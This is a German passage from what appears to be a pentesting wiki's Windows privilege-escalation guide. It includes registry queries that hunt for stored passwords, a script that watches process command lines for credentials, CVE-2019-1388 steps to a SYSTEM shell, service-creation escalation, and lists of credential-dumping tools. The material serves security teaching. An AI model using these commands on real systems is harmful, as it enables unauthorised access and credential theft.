```
**Suche im Registrierungseditor nach Schlüsselnamen und Passwörtern**

Um nach Schlüsselnamen und Passwörtern in der Registrierung zu suchen, können Sie die folgenden Schritte befolgen:

1. Öffnen Sie den Registrierungseditor, indem Sie "regedit" in der Befehlszeile oder im Ausführen-Dialogfeld eingeben.
2. Navigieren Sie zu dem gewünschten Registrierungszweig, in dem Sie nach Schlüsselnamen und Passwörtern suchen möchten.
3. Verwenden Sie die Suchfunktion des Registrierungseditors, um nach bestimmten Schlüsselnamen oder Passwörtern zu suchen. Geben Sie den Suchbegriff in das Suchfeld ein und klicken Sie auf "Suchen".
4. Der Registrierungseditor durchsucht nun den ausgewählten Registrierungszweig nach dem angegebenen Suchbegriff. Wenn ein Übereinstimmung gefunden wird, wird der entsprechende Schlüssel oder Wert hervorgehoben.
5. Überprüfen Sie die gefundenen Schlüssel oder Werte, um festzustellen, ob sie relevante Informationen enthalten, wie z.B. Passwörter.

Es ist wichtig zu beachten, dass das Durchsuchen der Registrierung nach Passwörtern ein sensibler Vorgang ist und nur in legitimen Szenarien durchgeführt werden sollte.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools zur Suche nach Passwörtern

Das [**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) ist ein msf-Plugin, das ich erstellt habe, um automatisch alle Metasploit-POST-Module auszuführen, die nach Anmeldeinformationen im Opfer suchen.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die auf dieser Seite erwähnte Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool zum Extrahieren von Passwörtern aus einem System.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach Sitzungen, Benutzernamen und Passwörtern mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Ausgelaufene Handler

Stellen Sie sich vor, dass **ein als SYSTEM ausgeführter Prozess einen neuen Prozess** (`OpenProcess()`) mit **vollen Zugriffsrechten öffnet**. Derselbe Prozess **erstellt auch einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, erbt jedoch alle offenen Handler des Hauptprozesses**.\
Wenn Sie nun **vollen Zugriff auf den Prozess mit niedrigen Berechtigungen haben**, können Sie den **offenen Handler zum erstellten privilegierten Prozess** mit `OpenProcess()` abrufen und einen Shellcode einschleusen.\
[Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie Sie diese Sicherheitslücke erkennen und ausnutzen** können.](leaked-handle-exploitation.md)\
[Lesen Sie diesen **weiteren Beitrag für eine umfassendere Erklärung, wie Sie mehr offene Handler von Prozessen und Threads mit unterschiedlichen Berechtigungsstufen testen und ausnutzen können (nicht nur volle Zugriffsrechte)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsame Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation zwischen Prozessen und den Datentransfer.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht zusammenhängende Prozesse Daten teilen können, sogar über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der die Rollen als **Named Pipe Server** und **Named Pipe Client** definiert sind.

Wenn ein **Client** Daten durch eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, die Identität des **Clients** annehmen, sofern er die erforderlichen **SeImpersonate**-Rechte besitzt. Wenn Sie einen **privilegierten Prozess** identifizieren, der über eine Pipe kommuniziert, können Sie durch Übernahme der Identität dieses Prozesses, sobald er mit der von Ihnen erstellten Pipe interagiert, **höhere Berechtigungen erlangen**. Anleitungen zur Durchführung eines solchen Angriffs finden Sie [**hier**](named-pipe-client-impersonation.md) und [**hier**](./#from-high-integrity-to-system).

Auch das folgende Tool ermöglicht es, **eine Named Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht das Auflisten und Anzeigen aller Pipes, um Privilege Escalations zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Sonstiges

### **Überwachung von Befehlszeilen zur Passworterfassung**

Wenn Sie eine Shell als Benutzer erhalten, werden möglicherweise geplante Aufgaben oder andere Prozesse ausgeführt, die **Anmeldeinformationen in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen und vergleicht den aktuellen Zustand mit dem vorherigen Zustand, um etwaige Unterschiede auszugeben.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Vom Benutzer mit niedrigen Privilegien zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC-Bypass

Wenn Sie Zugriff auf die grafische Benutzeroberfläche haben (über Konsole oder RDP) und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem nicht privilegierten Benutzer auszuführen.

Dies ermöglicht es, Privilegien zu eskalieren und gleichzeitig mit derselben Schwachstelle UAC zu umgehen. Darüber hinaus ist keine Installation erforderlich und die während des Prozesses verwendete Binärdatei ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, müssen Sie die folgenden Schritte ausführen:

```
1) Klicken Sie mit der rechten Maustaste auf die Datei HHUPD.EXE und führen Sie sie als Administrator aus.

2) Wenn die UAC-Aufforderung angezeigt wird, wählen Sie "Weitere Details anzeigen".

3) Klicken Sie auf "Zertifikatinformationen des Herausgebers anzeigen".

4) Wenn das System anfällig ist, kann beim Klicken auf den URL-Link "Ausgestellt von" der Standard-Webbrowser angezeigt werden.

5) Warten Sie, bis die Website vollständig geladen ist, und wählen Sie "Speichern unter", um ein Explorer-Fenster anzuzeigen.

6) Geben Sie im Adresspfad des Explorer-Fensters cmd.exe, powershell.exe oder einen anderen interaktiven Prozess ein.

7) Sie haben jetzt eine Eingabeaufforderung für "NT\AUTHORITY SYSTEM".

8) Denken Sie daran, die Installation und die UAC-Aufforderung abzubrechen, um zu Ihrem Desktop zurückzukehren.
```

Sie haben alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388

## Vom Administrator mit mittlerem zu hohem Integritätslevel / UAC-Bypass

Lesen Sie dies, um mehr über Integritätslevel zu erfahren:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Lesen Sie dann dies, um mehr über UAC und UAC-Bypasses zu erfahren:

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## Vom hohen Integritätslevel zum System

### Neuer Dienst

Wenn Sie bereits auf einem Prozess mit hohem Integritätslevel ausgeführt werden, kann der Übergang zum SYSTEM einfach sein, indem Sie einen neuen Dienst erstellen und ausführen:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Aus einem Prozess mit hoher Integrität heraus können Sie versuchen, die AlwaysInstallElevated-Registrierungseinträge zu aktivieren und eine Reverse Shell mit einem .msi-Wrapper zu installieren.
[Weitere Informationen zu den beteiligten Registrierungsschlüsseln und zur Installation eines .msi-Pakets finden Sie hier.](./#alwaysinstallelevated)

### High + SeImpersonate-Berechtigung zu System

**Sie können den Code hier finden.** (seimpersonate-from-high-to-system.md)

### Von SeDebug + SeImpersonate zu vollen Token-Berechtigungen

Wenn Sie über diese Token-Berechtigungen verfügen (wahrscheinlich finden Sie dies in einem bereits vorhandenen Prozess mit hoher Integrität), können Sie fast jeden Prozess (außer geschützte Prozesse) mit der SeDebug-Berechtigung öffnen, das Token des Prozesses kopieren und einen beliebigen Prozess mit diesem Token erstellen.
Bei dieser Technik wird normalerweise ein Prozess ausgewählt, der als SYSTEM ausgeführt wird und alle Token-Berechtigungen hat (ja, Sie können SYSTEM-Prozesse finden, die nicht alle Token-Berechtigungen haben).
**Sie können hier ein Beispielcode finden, der die vorgeschlagene Technik ausführt.** (sedebug-+-seimpersonate-copy-token.md)

### Named Pipes

Diese Technik wird von Meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, eine Pipe zu erstellen und dann einen Dienst zu erstellen/missbrauchen, um in diese Pipe zu schreiben. Anschließend kann der Server, der die Pipe mit der SeImpersonate-Berechtigung erstellt hat, das Token des Pipe-Clients (des Dienstes) übernehmen und SYSTEM-Berechtigungen erhalten.
Wenn Sie mehr über Named Pipes erfahren möchten, sollten Sie dies lesen.
Wenn Sie ein Beispiel dafür lesen möchten, wie Sie von hoher Integrität zu System gelangen können, indem Sie Named Pipes verwenden, sollten Sie dies lesen. (from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

Wenn es Ihnen gelingt, eine DLL zu hijacken, die von einem als SYSTEM ausgeführten Prozess geladen wird, können Sie beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch für diese Art von Privilege Escalation nützlich und außerdem viel einfacher von einem Prozess mit hoher Integrität aus zu erreichen, da dieser Schreibberechtigungen auf den zum Laden von DLLs verwendeten Ordnern hat.
**Sie können hier mehr über Dll Hijacking erfahren.** (dll-hijacking.md)

### Von Administrator oder Network Service zu System

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollen Berechtigungen

Lesen Sie: [https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zur Suche nach Windows-Privilege-Escalation-Vektoren:** [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[PrivescCheck](https://github.com/itm4n/PrivescCheck)\
[PowerSploit-Privesc(PowerUP)](https://github.com/PowerShellMafia/PowerSploit) - Überprüfen Sie auf Fehlkonfigurationen und sensible Dateien (hier überprüfen). Erkannt.\
[JAWS](https://github.com/411Hall/JAWS) - Überprüfen Sie auf mögliche Fehlkonfigurationen und sammeln Sie Informationen (hier überprüfen).\
[privesc](https://github.com/enjoiz/Privesc) - Überprüfen Sie auf Fehlkonfigurationen\
[SessionGopher](https://github.com/Arvanaghi/SessionGopher) - Extrahiert PuTTY-, WinSCP-, SuperPuTTY-, FileZilla- und RDP-gespeicherte Sitzungsinformationen. Verwenden Sie -Thorough lokal.\
[Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump) - Extrahiert Anmeldeinformationen aus dem Anmeldeinformations-Manager. Erkannt.\
[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) - Sprühen Sie gesammelte Passwörter über die Domäne\
[Inveigh](https://github.com/Kevin-Robertson/Inveigh) - Inveigh ist ein PowerShell-ADIDNS/LLMNR/mDNS/NBNS-Spoofing- und Man-in-the-Middle-Tool.\
[WindowsEnum](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) - Grundlegende Privesc-Windows-Enumeration\
[~~Sherlock~~](https://github.com/rasta-mouse/Sherlock) - Suchen Sie nach bekannten Privesc-Schwachstellen (für Watson veraltet)\
[~~WINspect~~](https://github.com/A-mIn3/WINspect) - Lokale Überprüfungen (benötigt Administratorrechte)

**Exe**

[Watson](https://github.com/rasta-mouse/Watson) - Suchen Sie nach bekannten Privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) (vorkompiliert)\
[SeatBelt](https://github.com/GhostPack/Seatbelt) - Enumeriert den Host und sucht nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Privilege Escalation) (muss kompiliert werden) (vorkompiliert)\
[LaZagne](https://github.com/AlessandroZ/LaZagne) - Extrahiert Anmeldeinformationen aus vielen Programmen (vorkompilierte exe auf GitHub)\
[SharpUP](https://github.com/GhostPack/SharpUp) - Portierung von PowerUp nach C#\
[~~Beroot~~](https://github.com/AlessandroZ/BeRoot) - Überprüfen Sie auf Fehlkonfigurationen (ausführbare Datei vorkompiliert auf GitHub). Nicht empfohlen. Funktioniert nicht gut in Win10.\
[~~Windows-Privesc-Check~~](https://github.com/pentestmonkey/windows-privesc-check) - Überprüfen Sie auf mögliche Fehlkonfigurationen (exe von Python). Nicht empfohlen. Funktioniert nicht gut in Win10.

**Bat**

[winPEASbat](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Tool, das auf diesem Beitrag basiert (es benötigt accesschk, um ordnungsgemäß zu funktionieren, kann es aber verwenden).

**Lokal**

[Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - Liest die Ausgabe von systeminfo und empfiehlt funktionierende Exploits (lokales Python)\
[Windows Exploit Suggester Next Generation](https://github.com/bitsadmin/wesng) - Liest die Ausgabe von systeminfo und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Sie müssen das Projekt mit der richtigen Version von .NET kompilieren (siehe dies). Um die installierte Version von .NET auf dem Opferrechner anzuzeigen, können Sie Folgendes tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliographie

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
